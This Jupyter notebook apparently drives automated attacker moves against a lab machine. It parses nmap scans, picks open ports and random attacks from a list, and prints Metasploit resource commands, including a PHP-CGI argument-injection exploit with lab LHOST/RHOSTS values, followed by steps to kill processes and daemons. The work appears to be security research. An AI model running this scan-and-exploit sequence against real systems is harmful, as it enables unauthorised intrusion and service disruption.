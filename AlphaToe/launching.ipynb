{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "satellite-sigma",
   "metadata": {},
   "outputs": [],
   "source": [
    "import xml.etree.ElementTree as ET\n",
    "import pickle\n",
    "import pandas as pd\n",
    "import random"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "biological-population",
   "metadata": {},
   "outputs": [],
   "source": [
    "port_mapping = {21: \"ftp\",\n",
    "                22: \"ssh\",\n",
    "                23: \"telnet\",\n",
    "                25: \"smtp\",\n",
    "                53: \"domain\",\n",
    "                80: \"http\",\n",
    "                111: \"rpcbind\",\n",
    "                139: \"netbios-ssn\",\n",
    "                445: \"microsoft-ds\",\n",
    "                512: \"exec\",\n",
    "                513: \"login\",\n",
    "                514: \"shell\",\n",
    "                1099: \"rmiregistry\",\n",
    "                1524: \"ingreslock\",\n",
    "                2049: \"nfs\",\n",
    "                2121: \"ccproxy-ftp\",\n",
    "                3306: \"mysql\",\n",
    "                5432: \"postgresql\",\n",
    "                5900: \"vnc\",\n",
    "                6000: \"X11\",\n",
    "                6667: \"irc\",\n",
    "                8009: \"ajp13\",\n",
    "                8180: \"unknown\"}\n",
    "\n",
    "id_port_mapping = {0: 21,\n",
    "                   1: 80,\n",
    "                   2: 5432,\n",
    "                   3: 5432,\n",
    "                   4: 5432,\n",
    "                   5: 5432,\n",
    "                   6: 5432,\n",
    "                   7: 5432,\n",
    "                   8: 5432,\n",
    "                   9: 80,\n",
    "                   10: 80,\n",
    "                   11: 3632,\n",
    "                   12: 139}\n",
    "\n",
    "metasploit = {0: \"scan_command\",\n",
    "              1: \"use_command\",\n",
    "              2: \"set_command\",\n",
    "              3: \"exploit_command\",\n",
    "              4: \"kill_process_command\",\n",
    "              5: \"kill_daemon_command\",\n",
    "              6: \"nop_command\"}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "authorized-contemporary",
   "metadata": {},
   "outputs": [],
   "source": [
    "class evaluations:\n",
    "    def parse_nmaprun_xml(self, fname):\n",
    "        xml_tree = ET.parse(fname)\n",
    "        root = xml_tree.getroot()\n",
    "        outports = []\n",
    "        for child in root:\n",
    "            for nmap_child in root.iter(child.tag):\n",
    "                if nmap_child.tag == \"host\":\n",
    "                    for elem in nmap_child:\n",
    "                        if elem.tag == \"ports\":\n",
    "                            for ports in elem:\n",
    "                                if ports.tag == \"port\":\n",
    "                                    for port in ports:\n",
    "                                        port = {\n",
    "                                            \"port_id\": ports.attrib[\"portid\"],\n",
    "                                            \"protocol\": ports.attrib[\"protocol\"],\n",
    "                                            \"service_name\": port.attrib[\"name\"] if \"name\" in port.attrib else None}\n",
    "                                    outports.append(port)\n",
    "        return outports\n",
    "\n",
    "    def common(self, open_ports):\n",
    "        commands = pd.read_csv(\"./io/commands2.csv\")\n",
    "        command_ports = commands[\"linked_port\"].tolist()\n",
    "        command_ports = sorted(list(set(command_ports)))\n",
    "\n",
    "        open_ports_set = set(open_ports)\n",
    "        intersection = open_ports_set.intersection(command_ports)\n",
    "        return sorted(list(intersection))\n",
    "\n",
    "    # currenlty prints the file contents, can be repurposed to run them through msfconsole\n",
    "    def get_rc(self, c, script_id, step):\n",
    "        file = open(\"./io/vulnerability_scripts/{0}/{0}_{1}.rc\".format(script_id, step), \"r\")\n",
    "        print(file.read().splitlines())\n",
    "        \n",
    "    def get_command(self, c):\n",
    "        \n",
    "        if c == [0]:\n",
    "            # use os or subprocess library to launch scripts?\n",
    "            print(\"Port scan on target machine using Nmap...\")\n",
    "            print(\"./nmap.sh\")\n",
    "            \n",
    "        else:\n",
    "            if self.current_attack_id < 10:\n",
    "                script_id = \"000{0}\".format(self.current_attack_id)\n",
    "            else:\n",
    "                script_id = \"00{0}\".format(self.current_attack_id)\n",
    "\n",
    "            if c == [1]:\n",
    "                # use os or subprocess library to launch scripts?\n",
    "                print(\"msfconsole -r {0}_use.rc\".format(script_id))\n",
    "                self.get_rc(c, script_id, \"use\")\n",
    "\n",
    "            elif c == [2]:\n",
    "                # use os or subprocess library to launch scripts?\n",
    "                print(\"msfconsole -r {0}_set.rc\".format(script_id))\n",
    "                self.get_rc(c, script_id, \"set\")\n",
    "\n",
    "            elif c == [3]:\n",
    "                # use os or subprocess library to launch scripts?\n",
    "                print(\"msfconsole -r {0}_exploit.rc\".format(script_id))\n",
    "                self.get_rc(c, script_id, \"exploit\")\n",
    "\n",
    "            elif c == [4]:\n",
    "                port = self.attack_port\n",
    "                process = self.attacked_process\n",
    "                print(\"Kill process *{0}* on port *{1}*\".format(process, port))\n",
    "                \n",
    "            elif c == [5]:\n",
    "                print(\"Kill daemon\")\n",
    "\n",
    "    def eval_move(self, c, prev_state = [], current_state=[]):\n",
    "        \n",
    "        #command = get_state_mapping_evaluation(prev_state, current_state, debug)\n",
    "        \n",
    "        # scan command\n",
    "        if c == [0]:\n",
    "            \n",
    "            self.get_command(c)\n",
    "            \n",
    "            # parse nmap xml output\n",
    "            parsed = self.parse_nmaprun_xml(\"./io/portscan_out.xml\")\n",
    "            ports = []\n",
    "\n",
    "            # get all open ports\n",
    "            for port in parsed:\n",
    "                ports.append(int(port[\"port_id\"]))\n",
    "\n",
    "            # find common ports between those that are open and those that we have attacks for\n",
    "            common_ports = self.common(ports)\n",
    "            \n",
    "            # shuffle open, common ports\n",
    "            # this is done so that the attacker picks a random port to attack when starting out\n",
    "            random.shuffle(common_ports)\n",
    "\n",
    "            # write open common ports to pickle file\n",
    "            with open(\"./io/attack_ports.pickle\", \"wb\") as f: pickle.dump(common_ports, f)\n",
    "\n",
    "        # use command\n",
    "        elif c == [1]:\n",
    "            # load open, common ports to attack\n",
    "            with open(\"./io/attack_ports.pickle\", \"rb\") as f: common_ports = pickle.load(f)\n",
    "            \n",
    "            # pick first port from list\n",
    "            self.attack_port = common_ports.pop(0)\n",
    "            \n",
    "            # save list of ports again, without the current attack port\n",
    "            with open(\"./io/attack_ports.pickle\", \"wb\") as f: pickle.dump(common_ports, f)\n",
    "\n",
    "            # get services to attack from commands db, find available attacks for port intended to attack\n",
    "            valid_attacks = pd.read_csv(\"./io/commands2.csv\")\n",
    "            attacks_for_current_port = valid_attacks[valid_attacks[\"linked_port\"] == self.attack_port]\n",
    "            \n",
    "            # of the possible attacks to mount given the current port, pick 1 at random and get corresponding process on port\n",
    "            self.current_attack_id = attacks_for_current_port.sample(n=1)[\"attack_id\"].to_list()[0]\n",
    "            self.attacked_process = port_mapping[self.attack_port]\n",
    "            \n",
    "            print(\"Attack ID *{0}*, attacking service *{1}* on port *{2}*\".format(self.current_attack_id, self.attacked_process,\n",
    "                                                                            self.attack_port))\n",
    "            \n",
    "            self.get_command(c)\n",
    "            \n",
    "        else:\n",
    "            '''\n",
    "            c == [2] --> set command\n",
    "            c == [3] --> exploit command\n",
    "            c == [4] --> kill process command\n",
    "            c == [5] --> kill daemon command\n",
    "            '''\n",
    "            self.get_command(c)\n",
    "            \n",
    "            "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "cloudy-gallery",
   "metadata": {},
   "outputs": [],
   "source": [
    "func = evaluations()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "australian-subsection",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Port scan on target machine using Nmap...\n",
      "./nmap.sh\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "behind-research",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[80, 139, 21, 5432]"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open(\"./io/attack_ports.pickle\", \"rb\") as f: common_ports = pickle.load(f)\n",
    "common_ports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "infrared-reduction",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Attack ID *10*, attacking service *http* on port *80*\n",
      "msfconsole -r 0010_use.rc\n",
      "['use exploit/multi/http/php_cgi_arg_injection']\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[1])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "unavailable-switzerland",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "msfconsole -r 0010_set.rc\n",
      "['set LHOST 10.0.2.15', 'set target 0', 'set RHOSTS 192.168.56.101']\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[2])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "promotional-subscriber",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "msfconsole -r 0010_exploit.rc\n",
      "['run']\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[3])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "national-constitutional",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Kill process *http* on port *80*\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[4])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "departmental-pierre",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Kill daemon\n"
     ]
    }
   ],
   "source": [
    "func.eval_move(c=[5])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "center-aging",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
